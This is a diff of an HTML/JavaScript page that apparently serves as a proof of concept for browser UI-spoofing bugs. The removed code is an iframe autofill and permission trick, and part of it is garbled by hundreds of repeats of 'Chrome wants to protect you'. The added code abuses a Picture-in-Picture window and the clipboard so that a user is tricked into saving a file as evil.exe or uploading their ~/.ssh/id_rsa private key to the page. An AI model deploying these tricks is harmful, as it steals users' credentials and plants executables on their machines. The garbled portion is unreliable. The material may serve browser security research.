@@ -1,86 +1,68 @@
-<style>
-  #qform {
-    position: absolute;
-    top: -15px;
-    left: 110px;
-    opacity: 0;
-  }
-</style>
+<button onclick="start()">Click here</button>
+<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-<form name="qform" id="qform" action="?t#faker" method="get">
-  <input type="text" id="qb" name="qb" autofocus>
-</form>
-
-<h3 id="qmsg">Loading</h3>
+<pre id="contents"></pre>
 
 <script>
-  let msgs = 0;
-  let iframes = [];
+const fileWritePath = "%userprofile%\\\\evil.exe";
+const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
 
-  function createAutofillEntry(str) {
-    let aframe = document.createElement('iframe');
-    aframe.src = '#faker';
-    aframe.style = 'width:2px;height:3px;opacity:0.1';
-    aframe['data-id'] = msgs;
-    iframes[msgs] = false;
-    msgs += 1;
-    document.body.appendChild(aframe);
+async function loadFile(file) {
+  window.moveTo(0, 0);
+  window.resizeTo(500, 500);
+  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
+}
 
-    aframe.onload = (e) => {
-      if (e.target.contentWindow.location.search.length <= 10) {
-        e.target.contentWindow.eval(`
-          let thing = "${str}";
-          let i = 0;
-          let ger = setInterval(() => {
-            qb.value += thing[i];
-            i++;
-            if (thing.length === i) {
-              clearInterval(ger);
-              qform.submit();
-            }
-          }, 30);
-        `);
-      } else {
-        iframes[e.target['data-id']] = true;
-      }
-    };
-  }
-
-  if (location.hash === '#faker') {
-    // Logic when hash is '#faker'
-  } else if (location.hash === '#ok') {
-    document.getElementById('qmsg').innerHTML = 'Click here';
-    window.onclick = () => {
-      navigator.mediaDevices.getUserMedia({ audio: false, video: { width: 1280, height: 720 } });
-      setTimeout(() => {
-        document.getElementById('qb').focus();
-        document.execCommand('insertText', false, ' ');
-      }, 150);
-    };
-  } else { youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect youChrome wants to protect you");
-    setInterval(() => {
-      let allLoaded = iframes.every((frameStatus) => frameStatus === true);
-      if (allLoaded) {
-        console.log("yes");
-        location.hash = '#ok';
-        location.reload(true);
-      }
-    }, 500);
-  }
-
-  const trigger = document.getElementById('trigger');
-  trigger.onclick = () => {
-    history.pushState({}, '', '/trusted');
-    document.getElementById('panel').style.display = 'block';
-  };
-
-  window.addEventListener('pageshow', () => {
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          location.href = 'https://google.com:9090';
-        }, 80);
-      });
-    });
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
   });
+  pipWindow.document.body.innerHTML = `
+  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
+  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
+  <script>
+  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
+  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+
+  setTimeout(()=>
+    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
+    400
+  );
+
+  function copyToClipboard(text) {
+    const textarea = document.createElement("textarea");
+    textarea.style.opacity = "0%";
+    textarea.textContent = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+  }
+
+  <${'/'}script>
+  `;
+};
+
+function download(data, filename, type) {
+  const file = new Blob([data], {type: type});
+  const a = document.createElement("a");
+  const url = window.URL.createObjectURL(file);
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+}
+
+function start() {
+  pipOpen();
+}
+
+if (window.name == "popup-write") {
+  download("This is an evil executable", "harmless");
+  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
+} else if (window.name == "popup-read") {
+  document.body.onkeydown = () => document.getElementById("upload").click();
+}
 </script>
